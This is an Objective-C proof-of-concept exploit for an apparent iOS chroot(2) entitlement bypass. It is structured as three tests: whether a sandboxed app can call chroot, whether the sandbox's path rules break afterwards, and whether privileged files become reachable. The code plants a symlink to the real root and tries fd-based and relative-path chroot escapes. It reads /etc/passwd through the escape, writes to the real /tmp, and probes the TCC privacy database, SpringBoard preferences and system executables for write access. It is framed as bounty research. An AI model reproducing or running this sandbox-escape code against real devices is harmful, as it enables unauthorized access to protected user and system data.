/*
 * CVE-2026-43689 — chroot(2) Entitlement Bypass: Three-Question PoC
 *
 * Target: iOS 26.6.2 (iPhone 17 Pro, arm64e)
 *
 * This PoC answers three binary questions:
 *   Q1: Can a sandboxed mobile-uid app call chroot(2) without EPERM?
 *   Q2: Post-chroot, does Seatbelt's path-based sandbox still bind correctly?
 *   Q3: Can we reach anything privileged through the confusion?
 *
 * Build: Add to an iOS app project. Link no extra frameworks (just Foundation).
 *
 * LEGAL: Apple Security Bounty research on owned device only.
 *        DMCA §1201(f)(j) exemptions apply.
 */

#import <Foundation/Foundation.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <dirent.h>
#include <dlfcn.h>
#include <mach/mach.h>

#pragma mark - Logging

#define LOG(fmt, ...) NSLog(@"[CVE-2026-43689] " fmt, ##__VA_ARGS__)
#define PASS(fmt, ...) NSLog(@"[+] " fmt, ##__VA_ARGS__)
#define FAIL(fmt, ...) NSLog(@"[-] " fmt, ##__VA_ARGS__)
#define INFO(fmt, ...) NSLog(@"[*] " fmt, ##__VA_ARGS__)

#pragma mark - Q1: Can chroot(2) be called?

typedef struct {
    BOOL chroot_succeeded;
    int chroot_errno;
    BOOL is_sandboxed;
    uid_t uid;
    uid_t euid;
} Q1Result;

static Q1Result testQ1_ChrootCallable(NSString *fakeRootPath) {
    Q1Result result = {0};
    result.uid = getuid();
    result.euid = geteuid();

    LOG(@"=== Q1: Can a sandboxed app call chroot(2)? ===");
    INFO(@"UID: %d, EUID: %d, PID: %d", result.uid, result.euid, getpid());

    // Detect sandbox
    // sandbox_check is private API but we can infer from behavior
    NSString *container = NSHomeDirectory();
    result.is_sandboxed = [container containsString:@"Containers"];
    INFO(@"Container: %@", container);
    INFO(@"Appears sandboxed: %@", result.is_sandboxed ? @"YES" : @"NO");

    // Create minimal fake root structure
    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *error = nil;

    NSArray *dirs = @[@"etc", @"tmp", @"var", @"var/mobile", @"private", @"private/var"];
    for (NSString *dir in dirs) {
        NSString *path = [fakeRootPath stringByAppendingPathComponent:dir];
        [fm createDirectoryAtPath:path withIntermediateDirectories:YES
                       attributes:nil error:&error];
    }

    // Place marker file
    NSString *marker = [fakeRootPath stringByAppendingPathComponent:@"etc/.chroot_marker"];
    [@"Q1-CONFIRMED" writeToFile:marker atomically:YES
                        encoding:NSUTF8StringEncoding error:nil];

    // Record what we can access BEFORE chroot
    INFO(@"Pre-chroot: checking baseline access...");
    struct stat st;
    BOOL canStatRealEtc = (stat("/etc/passwd", &st) == 0);
    INFO(@"  stat(/etc/passwd) = %@", canStatRealEtc ? @"OK" : @"FAIL");

    // chdir into the fake root (chroot requires this for correctness)
    if (chdir([fakeRootPath UTF8String]) != 0) {
        FAIL(@"chdir to fakeroot failed: %s", strerror(errno));
        result.chroot_errno = errno;
        return result;
    }

    // ===== THE CRITICAL CALL =====
    int ret = chroot([fakeRootPath UTF8String]);
    result.chroot_errno = errno;
    result.chroot_succeeded = (ret == 0);

    if (ret == 0) {
        PASS(@"!!!!! chroot(2) RETURNED 0 — SYSCALL SUCCEEDED !!!!!");
        PASS(@"Q1 ANSWER: YES — sandboxed mobile-uid app can chroot");

        // Verify we're in the fake root
        BOOL markerExists = (stat("/etc/.chroot_marker", &st) == 0);
        PASS(@"  /etc/.chroot_marker exists: %@", markerExists ? @"YES (confirmed in fake root)" : @"NO");

        // Can we still see the real /etc/passwd?
        BOOL realPasswd = (stat("/etc/passwd", &st) == 0);
        INFO(@"  /etc/passwd visible: %@ (should be NO if properly chrooted)", realPasswd ? @"YES" : @"NO");

    } else {
        FAIL(@"chroot(2) FAILED: errno=%d (%s)", result.chroot_errno, strerror(result.chroot_errno));

        switch (result.chroot_errno) {
            case EPERM:
                FAIL(@"Q1 ANSWER: NO — EPERM. Kernel still has a root-uid check");
                FAIL(@"  The entitlement gate is absent, but a separate root check blocks us.");
                FAIL(@"  Bug may only be exploitable from root-but-unentitled contexts.");
                break;
            case EACCES:
                FAIL(@"Q1 ANSWER: NO — EACCES. Sandbox profile filters chroot(2)");
                FAIL(@"  Seatbelt has a syscall filter for chroot independent of the kernel check.");
                break;
            default:
                FAIL(@"Q1 ANSWER: NO — unexpected error %d", result.chroot_errno);
                break;
        }
    }

    return result;
}

#pragma mark - Q2: Do sandbox path rules still bind?

typedef struct {
    BOOL sandbox_confused;
    BOOL can_write_outside_container;
    BOOL can_read_forbidden;
    BOOL symlink_escape_works;
} Q2Result;

static Q2Result testQ2_SandboxPathConfusion(NSString *fakeRootPath) {
    Q2Result result = {0};

    LOG(@"=== Q2: Post-chroot, do sandbox path rules still bind? ===");
    INFO(@"We are now chrooted. Testing if Seatbelt resolves paths correctly.");

    // Test 2a: Write to a "system" path
    // Post-chroot, "/etc/test" resolves to fakeroot/etc/test on disk.
    // Question: Does Seatbelt see "/etc/test" (and maybe allow/deny based on that)?
    // Or does it resolve to the real path and enforce correctly?
    {
        int fd = open("/etc/sandbox_write_test", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (fd >= 0) {
            const char *data = "sandbox-test";
            write(fd, data, strlen(data));
            close(fd);
            PASS(@"Test 2a: Wrote to /etc/sandbox_write_test (post-chroot)");
            INFO(@"  This file lands at fakeroot/etc/ on the real FS — expected to succeed.");
            unlink("/etc/sandbox_write_test");
        } else {
            FAIL(@"Test 2a: Cannot write /etc/sandbox_write_test: %s", strerror(errno));
        }
    }

    // Test 2b: Write to a path that would normally be OUTSIDE our container
    // Post-chroot, "/var/mobile/Library/Preferences/test.plist" maps to fakeroot/var/mobile/...
    // If sandbox sees the APPARENT path and allows it (mobile can normally write to ~/Library/Preferences),
    // that's fine. But if it confuses the container boundary...
    {
        // Create the directory structure first
        mkdir("/var/mobile/Library", 0755);
        mkdir("/var/mobile/Library/Preferences", 0755);

        int fd = open("/var/mobile/Library/Preferences/sandbox_test.plist",
                      O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (fd >= 0) {
            write(fd, "test", 4);
            close(fd);
            INFO(@"Test 2b: Wrote to /var/mobile/Library/Preferences/ (post-chroot)");
            INFO(@"  Expected: allowed (resolves to fakeroot, not real prefs)");
        } else {
            INFO(@"Test 2b: Cannot write prefs path: %s", strerror(errno));
        }
    }

    // Test 2c: Symlink escape attempt
    // Classic chroot escape: create symlink inside fakeroot pointing to "/"
    // After chroot, follow the symlink to reach the real filesystem
    // THEN test if sandbox allows operations through the escaped path
    {
        // We need to have created this symlink BEFORE chroot, or use relative paths
        // After chroot, we can't create symlinks pointing outside since we can't name "outside"
        // But if we pre-planted a symlink: fakeroot/escape -> /
        // Post-chroot, /escape -> real /

        // Test: can we read through a pre-planted symlink?
        // Note: this symlink must have been created BEFORE the chroot call
        struct stat st;
        if (stat("/escape/etc/passwd", &st) == 0) {
            PASS(@"Test 2c: !!!!! SYMLINK ESCAPE WORKS !!!!!");
            PASS(@"  /escape/etc/passwd is accessible — reached real filesystem");
            result.symlink_escape_works = YES;

            // Now the big test: can we WRITE through the escape?
            int fd = open("/escape/tmp/chroot_escape_proof", O_CREAT | O_WRONLY | O_TRUNC, 0644);
            if (fd >= 0) {
                const char *proof = "CVE-2026-43689 sandbox escape confirmed\n";
                write(fd, proof, strlen(proof));
                close(fd);
                PASS(@"!!!!! WROTE TO REAL /tmp VIA SYMLINK ESCAPE !!!!!");
                PASS(@"Q2 ANSWER: YES — sandbox path rules are CONFUSED post-chroot");
                result.sandbox_confused = YES;
                result.can_write_outside_container = YES;
            } else {
                INFO(@"Test 2c: Symlink escape readable but not writable: %s", strerror(errno));
                INFO(@"  Seatbelt may resolve the real path for write checks");
            }

            // Read test
            fd = open("/escape/etc/passwd", O_RDONLY);
            if (fd >= 0) {
                char buf[256];
                ssize_t n = read(fd, buf, sizeof(buf) - 1);
                close(fd);
                if (n > 0) {
                    buf[n] = '\0';
                    PASS(@"Read real /etc/passwd via escape: %.40s...", buf);
                    result.can_read_forbidden = YES;
                }
            }
        } else {
            INFO(@"Test 2c: /escape/etc/passwd not accessible (%s)", strerror(errno));
            INFO(@"  Symlink escape didn't reach real FS, or symlink wasn't pre-planted");
        }
    }

    // Test 2d: Relative path escape (classic chroot breakout for root users)
    // fd = open(".", O_RDONLY); chroot(fakeroot); fchdir(fd); chdir("../../..")
    // This requires the open(".",) to happen BEFORE chroot. Our PoC does chroot
    // in Q1, so we'd need to have saved the fd. For now, test if /../../../ works.
    {
        struct stat st;
        if (stat("/../../../etc/passwd", &st) == 0) {
            PASS(@"Test 2d: Relative escape via /../../../etc/passwd WORKS");
            result.sandbox_confused = YES;
        } else {
            INFO(@"Test 2d: Relative escape blocked: %s", strerror(errno));
        }
    }

    if (!result.sandbox_confused) {
        INFO(@"Q2 ANSWER: Sandbox appears to resolve paths correctly post-chroot");
        INFO(@"  Or: the escape paths we tested aren't the right vector");
    }

    return result;
}

#pragma mark - Q3: Can we reach anything privileged?

static void testQ3_PrivilegedAccess(Q2Result q2) {
    LOG(@"=== Q3: Can we influence anything privileged? ===");

    if (!q2.sandbox_confused && !q2.symlink_escape_works) {
        INFO(@"Q3: Skipping — no sandbox confusion or escape confirmed in Q2");
        INFO(@"  Without sandbox escape, privileged access is unlikely.");
        return;
    }

    // Test 3a: Mach service registration
    // Can we register a bootstrap service with a system name?
    {
        mach_port_t port = MACH_PORT_NULL;
        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
        if (kr == KERN_SUCCESS) {
            // Try registering with a system service name
            // (bootstrap_register is deprecated but still works)
            INFO(@"Test 3a: Allocated Mach port. Service registration test would go here.");
            INFO(@"  (Not attempting actual system service impersonation in PoC)");
            mach_port_deallocate(mach_task_self(), port);
        }
    }

    // Test 3b: If we have symlink escape + write, test specific targets
    if (q2.can_write_outside_container) {
        PASS(@"Test 3b: We have write-outside-container. Probing targets:");

        struct {
            const char *path;
            const char *desc;
        } targets[] = {
            {"/escape/var/db/TCC/TCC.db", "TCC database (privacy permissions)"},
            {"/escape/var/mobile/Library/Preferences/com.apple.springboard.plist", "SpringBoard prefs"},
            {"/escape/var/mobile/Library/Caches/", "Mobile caches directory"},
            {"/escape/private/var/containers/Shared/SystemGroup/", "Shared system containers"},
            {"/escape/usr/libexec/", "System executables"},
            {NULL, NULL}
        };

        for (int i = 0; targets[i].path; i++) {
            struct stat st;
            if (stat(targets[i].path, &st) == 0) {
                int writable = access(targets[i].path, W_OK);
                PASS(@"  REACHABLE %s: %s (writable: %s)",
                     writable == 0 ? "[RW]" : "[RO]",
                     targets[i].desc,
                     writable == 0 ? "YES" : "no");
            } else {
                INFO(@"  unreachable: %s", targets[i].desc);
            }
        }
    }

    // Test 3c: Environment-based confusion
    // Some processes resolve files via environment variables or relative paths
    // Post-chroot, we might be able to influence PATH, DYLD_*, etc. if we exec
    {
        INFO(@"Test 3c: Post-chroot exec environment");
        // Just report what exec would see
        char *path = getenv("PATH");
        INFO(@"  PATH: %s", path ? path : "(null)");
    }
}

#pragma mark - Setup: Pre-chroot symlink planting

static void plantSymlinkEscape(NSString *fakeRootPath) {
    // Plant symlink BEFORE chroot so /escape -> real /
    NSString *escapePath = [fakeRootPath stringByAppendingPathComponent:@"escape"];

    // Remove if exists
    unlink([escapePath UTF8String]);
    rmdir([escapePath UTF8String]);

    int ret = symlink("/", [escapePath UTF8String]);
    if (ret == 0) {
        INFO(@"Planted symlink escape: %@ -> /", escapePath);
    } else {
        INFO(@"Symlink plant failed: %s (may need different strategy)", strerror(errno));
        // Alternative: try with relative path
        // Also try pointing to parent directories
        ret = symlink("../../../../../../../../", [escapePath UTF8String]);
        if (ret == 0) {
            INFO(@"Planted relative symlink escape");
        }
    }
}

#pragma mark - Entry Point

@interface ChrootPoCController : NSObject
+ (void)runPoC;
@end

@implementation ChrootPoCController

+ (void)runPoC {
    LOG(@"========================================");
    LOG(@"CVE-2026-43689 Three-Question PoC");
    LOG(@"Target: iOS 26.6.2, iPhone 17 Pro");
    LOG(@"========================================");

    NSString *container = NSHomeDirectory();
    NSString *fakeRoot = [container stringByAppendingPathComponent:@"Documents/fakeroot"];

    // Pre-chroot setup
    INFO(@"Setting up fake root at %@", fakeRoot);
    plantSymlinkEscape(fakeRoot);

    // Save a reference to the real root for post-chroot escape testing
    // (classic: open(".") before chroot, then fchdir after)
    int saved_root_fd = open("/", O_RDONLY);
    int saved_cwd_fd = open(".", O_RDONLY);
    INFO(@"Saved root fd: %d, cwd fd: %d", saved_root_fd, saved_cwd_fd);

    // Q1: Can we chroot?
    Q1Result q1 = testQ1_ChrootCallable(fakeRoot);

    if (!q1.chroot_succeeded) {
        LOG(@"========================================");
        LOG(@"RESULT: chroot(2) failed. Bug may be narrower than expected.");
        LOG(@"  errno=%d (%s)", q1.chroot_errno, strerror(q1.chroot_errno));
        if (q1.chroot_errno == EPERM) {
            LOG(@"  The kernel has a root-uid check in addition to the (missing) entitlement check.");
            LOG(@"  Bug exploitable from: root-but-unentitled daemons, not sandboxed apps.");
        }
        LOG(@"========================================");

        // Clean up saved fds
        if (saved_root_fd >= 0) close(saved_root_fd);
        if (saved_cwd_fd >= 0) close(saved_cwd_fd);
        return;
    }

    // Q1 succeeded — now try classic fd-based chroot escape
    INFO(@"Attempting fd-based chroot escape (for real FS access)...");
    if (saved_root_fd >= 0) {
        if (fchdir(saved_root_fd) == 0) {
            PASS(@"fchdir to saved root fd succeeded");
            // Now try to walk up
            for (int i = 0; i < 20; i++) {
                chdir("..");
            }
            char cwd[PATH_MAX];
            if (getcwd(cwd, sizeof(cwd))) {
                INFO(@"CWD after walking up: %s", cwd);
                if (strcmp(cwd, "/") == 0 || strlen(cwd) < 5) {
                    PASS(@"!!!!! ESCAPED CHROOT VIA FD + CHDIR !!!!!");
                }
            }
        } else {
            INFO(@"fchdir to saved root fd failed: %s", strerror(errno));
        }
        close(saved_root_fd);
    }
    if (saved_cwd_fd >= 0) close(saved_cwd_fd);

    // Q2: Sandbox path confusion
    Q2Result q2 = testQ2_SandboxPathConfusion(fakeRoot);

    // Q3: Privileged access
    testQ3_PrivilegedAccess(q2);

    // Summary
    LOG(@"========================================");
    LOG(@"SUMMARY");
    LOG(@"  Q1 chroot callable:     %@", q1.chroot_succeeded ? @"YES" : @"NO");
    LOG(@"  Q2 sandbox confused:    %@", q2.sandbox_confused ? @"YES" : @"NO");
    LOG(@"     symlink escape:      %@", q2.symlink_escape_works ? @"YES" : @"NO");
    LOG(@"     write outside:       %@", q2.can_write_outside_container ? @"YES" : @"NO");
    LOG(@"     read forbidden:      %@", q2.can_read_forbidden ? @"YES" : @"NO");
    LOG(@"========================================");
}

@end

#ifdef STANDALONE_BUILD
int main(int argc, const char *argv[]) {
    @autoreleasepool {
        [ChrootPoCController runPoC];
        return 0;
    }
}
#endif
